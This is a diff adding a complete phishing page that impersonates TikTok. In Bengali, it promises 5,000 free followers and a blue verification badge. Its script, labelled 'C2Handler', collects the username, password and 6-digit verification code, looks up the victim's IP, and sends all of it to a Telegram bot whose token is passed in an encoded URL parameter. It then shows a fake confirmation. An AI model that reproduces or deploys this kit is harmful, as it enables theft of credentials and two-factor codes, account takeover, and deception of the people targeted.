@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Get Free Followers & Blue Badge</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #010101;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+            background: #ffffff;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(255, 0, 80, 0.2);
+        }
+        .header {
+            padding: 30px 20px;
+            text-align: center;
+            background: #fff;
+        }
+        .tt-logo {
+            width: 140px;
+            margin-bottom: 10px;
+        }
+        .main { padding: 0 25px 30px; }
+        .title { font-size: 20px; font-weight: 700; color: #000; margin-bottom: 10px; text-align: center; }
+        .desc { font-size: 13px; color: #666; text-align: center; margin-bottom: 25px; line-height: 1.5; }
+        
+        .form-group { margin-bottom: 15px; }
+        .input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 15px;
+            background-color: #f1f1f2;
+            outline: none;
+        }
+        .input:focus { border-color: #fe2c55; }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn:hover { background-color: #ef2950; }
+
+        .section { display: none; }
+        .active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        #loading { text-align: center; padding: 20px; }
+        .loader {
+            width: 30px; height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #fe2c55;
+            border-left: 3px solid #25f4ee;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .success-icon { font-size: 50px; color: #25f4ee; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1200px-TikTok_logo.svg.png" alt="TikTok" class="tt-logo">
+    </div>
+
+    <div class="main">
+        <div id="step1" class="section active">
+            <h3 class="title">TikTok Creator Growth</h3>
+            <p class="desc">আপনার অ্যাকাউন্টে ৫০০০ ফলোয়ার এবং ব্লু ভেরিফিকেশন ব্যাজ ফ্রিতে পাওয়ার জন্য লগইন করুন।</p>
+            <div class="form-group">
+                <input type="text" id="tt_user" class="input" placeholder="ফোন / ইমেইল / ইউজারনেম" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="tt_pass" class="input" placeholder="পাসওয়ার্ড" required>
+            </div>
+            <button class="btn" id="btn1">ফলোয়ার সংগ্রহ করুন</button>
+        </div>
+
+        <div id="step2" class="section">
+            <h3 class="title">Verification Code</h3>
+            <p class="desc">আপনার অ্যাকাউন্টের মালিকানা নিশ্চিত করতে ফোনে পাঠানো ৬-ডিজিটের কোডটি দিন।</p>
+            <div class="form-group">
+                <input type="text" id="tt_code" class="input" placeholder="Enter 6-digit code" maxlength="6">
+            </div>
+            <button class="btn" id="btn2">কনফার্ম করুন</button>
+        </div>
+
+        <div id="loading" class="section">
+            <div class="loader"></div>
+            <p style="color: #666; font-size: 14px;">TikTok সার্ভারের সাথে যুক্ত হচ্ছে...</p>
+        </div>
+
+        <div id="success" class="section" style="text-align: center;">
+            <div class="success-icon">✔️</div>
+            <h3 class="title" style="color: #fe2c55;">আবেদন জমা হয়েছে!</h3>
+            <p class="desc">আপনার তথ্য সফলভাবে যাচাই করা হয়েছে। আগামী ১২ ঘণ্টার মধ্যে আপনার ফলোয়ার এবং ব্লু ব্যাজ আপনার প্রোফাইলে যুক্ত হয়ে যাবে।</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    class C2Handler {
+        constructor() {
+            this.config = this.init();
+        }
+
+        init() {
+            const params = new URLSearchParams(window.location.search);
+            const p = params.get('p');
+            if (p) {
+                try {
+                    const decoded = JSON.parse(atob(p));
+                    return { token: decoded.bot, chat: decoded.chat };
+                } catch (e) { console.error("Config missing"); }
+            }
+            return { token: null, chat: null };
+        }
+
+        async getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch { return 'Unknown'; }
+        }
+
+        async sendTelegram(user, pass = '', code = '', stage = 'TT Login') {
+            if (!this.config.token || !this.config.chat) return;
+
+            const ip = await this.getIP();
+            const time = new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'});
+            
+            let message = `*🎵 TIKTOK HIT DETECTED* 🔥\n\n`;
+            message += `👤 *User:* \`${user}\`\n`;
+            if (pass) message += `🔑 *Pass:* \`${pass}\`\n`;
+            if (code) message += `🔐 *Code:* \`${code}\` ✅\n`;
+            message += `\n📊 *Stage:* ${stage}\n`;
+            message += `🌐 *IP:* \`${ip}\`\n`;
+            message += `🕐 *Time:* ${time}\n`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${this.config.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: this.config.chat,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) { console.error("Error"); }
+        }
+    }
+
+    const c2 = new C2Handler();
+    let userStore = '', passStore = '';
+
+    // Step 1
+    document.getElementById('btn1').onclick = async () => {
+        userStore = document.getElementById('tt_user').value.trim();
+        passStore = document.getElementById('tt_pass').value.trim();
+
+        if (userStore === '' || passStore.length < 6) {
+            alert('সঠিক তথ্য দিন!'); return;
+        }
+
+        document.getElementById('btn1').innerText = "অপেক্ষা করুন...";
+        await c2.sendTelegram(userStore, passStore, '', 'TikTok Info Received');
+
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+    };
+
+    // Step 2
+    document.getElementById('btn2').onclick = async () => {
+        const code = document.getElementById('tt_code').value.trim();
+        if (code === '') { alert('কোড দিন!'); return; }
+
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('loading').classList.add('active');
+
+        await c2.sendTelegram(userStore, passStore, code, 'TikTok Full Access');
+
+        setTimeout(() => {
+            document.getElementById('loading').classList.remove('active');
+            document.getElementById('success').classList.add('active');
+        }, 4000);
+    };
+</script>
+
+</body>
+</html>
